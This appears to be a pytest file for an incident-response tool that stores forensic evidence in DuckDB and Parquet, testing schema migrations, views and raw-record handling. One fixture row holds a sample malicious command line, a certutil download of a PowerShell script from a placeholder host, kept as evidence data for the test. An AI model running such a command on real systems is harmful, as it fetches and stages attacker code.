"""T1: DuckDB schema, migrations, storage-tier views, Parquet round-trip."""

from __future__ import annotations

import sys
from datetime import datetime
from pathlib import Path

import duckdb
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))
from oreoa import db, vocab  # noqa: E402
from oreoa.normalize import record_id  # noqa: E402

CASE_ID = "2026-09-INC-042"
EV1 = "EV-001"
EV2 = "EV-002"


def case_dir(tmp_path: Path) -> Path:
    target = tmp_path / CASE_ID
    (target / "derived").mkdir(parents=True)
    return target


def core_row(family: str, ev_id: str = EV1, **overrides) -> dict:
    row = {
        "record_id": record_id(ev_id, "custom:test", "r1"),
        "case_id": CASE_ID,
        "ev_id": ev_id,
        "host": "WKS-042",
        "os": "windows",
        "artifact": "custom:test",
        "family": family,
        "user_name": None,
        "user_id": None,
        "user_id_type": None,
        "source_tool": "manual",
        "source_path": "samples/test.jsonl",
        "source_ref": "r1",
        "parser_version": "0.0.0",
        "mapping_version": "0.0.0",
        "ingested_at": datetime(2026, 9, 4, 12, 0, 0),
        "tags": [],
        "extra": "{}",
        "raw_policy": "kept",
        "raw": '{"source": "test"}',
    }
    row.update(overrides)
    return row


def test_migrations_run_once_and_idempotent(tmp_path: Path):
    target = case_dir(tmp_path)
    con = db.connect(target)
    versions = con.execute("SELECT version, name FROM schema_version ORDER BY version").fetchall()
    assert versions and versions[-1][0] == db.SCHEMA_VERSION
    con.close()
    con = db.connect(target)
    versions_again = con.execute("SELECT count(*) FROM schema_version").fetchone()[0]
    assert versions_again == len(db.MIGRATIONS)
    con.close()


def test_expected_tables_exist(tmp_path: Path):
    con = db.connect(case_dir(tmp_path))
    tables = {
        row[0]
        for row in con.execute(
            "SELECT table_name FROM information_schema.tables WHERE table_schema = 'main'"
        ).fetchall()
    }
    expected = set(db.MATERIALIZED_FAMILIES) | {"events", "entities", "relations", "hosts", "evidence"}
    assert expected <= tables
    assert not (set(db.VIEW_FAMILIES) & tables)
    con.close()


def test_duckdb_enums_match_vocab_tuples(tmp_path: Path):
    con = db.connect(case_dir(tmp_path))
    for enum_name, values in db.ENUM_VOCABS:
        labels = con.execute(f"SELECT enum_range(NULL::{enum_name})").fetchone()[0]
        assert tuple(labels) == tuple(values), f"enum drift for {enum_name}"
    con.close()


def test_no_raw_column_anywhere_in_duckdb(tmp_path: Path):
    con = db.connect(case_dir(tmp_path))
    for table in list(db.MATERIALIZED_FAMILIES) + ["events", "entities", "relations", "hosts", "evidence"]:
        columns = {
            row[0]
            for row in con.execute(
                "SELECT column_name FROM information_schema.columns WHERE table_name = ?", [table]
            ).fetchall()
        }
        assert "raw" not in columns, f"{table} stores raw"
        if table in db.MATERIALIZED_FAMILIES:
            assert "raw_policy" in columns
    detections_columns = {
        row[0]
        for row in con.execute(
            "SELECT column_name FROM information_schema.columns WHERE table_name = 'detections'"
        ).fetchall()
    }
    assert {"score", "score_factors"} <= detections_columns
    con.close()


def test_load_evidence_family_round_trip(tmp_path: Path):
    target = case_dir(tmp_path)
    con = db.connect(target)
    rows = [
        core_row(
            "executions",
            record_id=record_id(EV1, "custom:test", "r1"),
            exe_name="updater.exe",
            cmdline="updater.exe /install",
            ts_first=datetime(2026, 8, 30, 2, 0, 0),
            evidence_type="prefetch",
        ),
        core_row(
            "executions",
            record_id=record_id(EV1, "custom:test", "r2"),
            source_ref="r2",
            exe_name="certutil.exe",
            cmdline="certutil.exe -urlcache -f http://x/y.ps1 y.ps1",
            evidence_type="process_creation_log",
        ),
    ]
    db.write_parquet(target, EV1, "executions", rows)
    inserted = db.load_evidence_family(con, target, EV1, "executions")
    assert inserted == 2
    names = {row[0] for row in con.execute("SELECT exe_name FROM executions").fetchall()}
    assert names == {"updater.exe", "certutil.exe"}
    os_values = {row[0] for row in con.execute("SELECT os FROM executions").fetchall()}
    assert os_values == {"windows"}
    inserted_again = db.load_evidence_family(con, target, EV1, "executions")
    assert inserted_again == 2
    total = con.execute("SELECT count(*) FROM executions").fetchone()[0]
    assert total == 2
    con.close()


def test_view_family_load_rejected(tmp_path: Path):
    con = db.connect(case_dir(tmp_path))
    with pytest.raises(ValueError):
        db.load_evidence_family(con, Path("/unused"), EV1, "fs_entries")
    with pytest.raises(FileNotFoundError):
        db.load_evidence_family(con, Path("/unused"), EV1, "executions")
    con.close()


def test_tier_views_over_parquet_exclude_raw(tmp_path: Path):
    target = case_dir(tmp_path)
    con = db.connect(target)
    created = db.ensure_views(con, target)
    assert not any(created.values())
    db.write_parquet(
        target,
        EV1,
        "fs_entries",
        [
            core_row(
                "fs_entries",
                record_id=record_id(EV1, "custom:test", "m1"),
                path="C:\\Users\\j.dupont\\updater.exe",
                path_norm="c:/users/j.dupont/updater.exe",
                name="updater.exe",
                size=4096,
                is_dir=False,
            )
        ],
    )
    db.write_parquet(
        target,
        EV2,
        "fs_entries",
        [
            core_row(
                "fs_entries",
                ev_id=EV2,
                record_id=record_id(EV2, "custom:test", "m1"),
                host="SRV-DC01",
                source_ref="m1",
                path="/var/log/auth.log",
                path_norm="/var/log/auth.log",
                name="auth.log",
                is_dir=False,
            )
        ],
    )
    created = db.ensure_views(con, target)
    assert created["fs_entries"] is True
    count = con.execute("SELECT count(*) FROM fs_entries").fetchone()[0]
    assert count == 2
    hosts_seen = {row[0] for row in con.execute("SELECT host FROM fs_entries").fetchall()}
    assert hosts_seen == {"WKS-042", "SRV-DC01"}
    with pytest.raises(duckdb.Error):
        con.execute("SELECT raw FROM fs_entries").fetchall()
    view_type = con.execute(
        "SELECT table_type FROM information_schema.tables WHERE table_name = 'fs_entries'"
    ).fetchone()[0]
    assert view_type == "VIEW"
    con.close()


def test_find_raw_resolves_authoritative_records(tmp_path: Path):
    target = case_dir(tmp_path)
    con = db.connect(target)
    rid = record_id(EV1, "custom:test", "r1")
    db.write_parquet(target, EV1, "log_events", [core_row("log_events", record_id=rid)])
    raws = db.find_raw(con, target, "log_events", [rid, "0" * 64])
    assert raws == {rid: '{"source": "test"}'}
    empty = db.find_raw(con, target, "browser", [rid])
    assert empty == {}
    con.close()


def test_parquet_schema_column_order_contract(tmp_path: Path):
    schema = db.parquet_arrow_schema("executions")
    names = schema.names
    assert names[: len(db.CORE_COLUMNS)] == [name for name, _ in db.CORE_COLUMNS]
    assert names[len(db.CORE_COLUMNS)] == "raw"
    assert names[-1] == "evidence_type"
    from oreoa.db import parquet_columns

    parquet_names = [name for name, _ in parquet_columns("executions")]
    table_names = [name for name, _ in db._table_columns("executions")]
    assert [n for n in parquet_names if n != "raw"] == table_names


def test_events_table_exists_without_raw(tmp_path: Path):
    con = db.connect(case_dir(tmp_path))
    columns = {
        row[0]
        for row in con.execute(
            "SELECT column_name FROM information_schema.columns WHERE table_name = 'events'"
        ).fetchall()
    }
    assert {"ts", "ts_desc", "family", "record_id", "summary", "path_norm"} <= columns
    assert "raw" not in columns
    con.close()


def test_hosts_and_evidence_reference_tables(tmp_path: Path):
    target = case_dir(tmp_path)
    con = db.connect(target)
    con.execute(
        "INSERT INTO hosts VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        ["WKS-042", "windows", "Windows 11 23H2", "22631", "x64", "CORP.LOCAL", "Europe/Paris", 0, ["10.20.4.42"], [EV1], "poste utilisateur", "medium"],
    )
    con.execute(
        "INSERT INTO evidence VALUES (?, ?, ?, ?, ?, ?, ?)",
        [EV1, "WKS-042", "disk_image", "a" * 64, datetime(2026, 9, 1), None, None],
    )
    assert con.execute("SELECT count(*) FROM hosts").fetchone()[0] == 1
    assert con.execute("SELECT os FROM hosts WHERE host = 'WKS-042'").fetchone()[0] == "windows"
    assert con.execute("SELECT kind FROM evidence WHERE ev_id = 'EV-001'").fetchone()[0] == "disk_image"
    con.close()


def test_families_enum_covers_all_family_tables():
    assert tuple(sorted(vocab.FAMILIES)) == tuple(sorted(db.FAMILY_COLUMNS.keys()))


def test_family_columns_never_duplicate_core_columns():
    core_names = {name for name, _ in db.CORE_COLUMNS}
    for family, columns in db.FAMILY_COLUMNS.items():
        names = [name for name, _ in columns]
        assert len(names) == len(set(names)), f"duplicate column in {family}"
        overlap = core_names & set(names)
        assert not overlap, f"{family} re-declares core columns: {sorted(overlap)}"
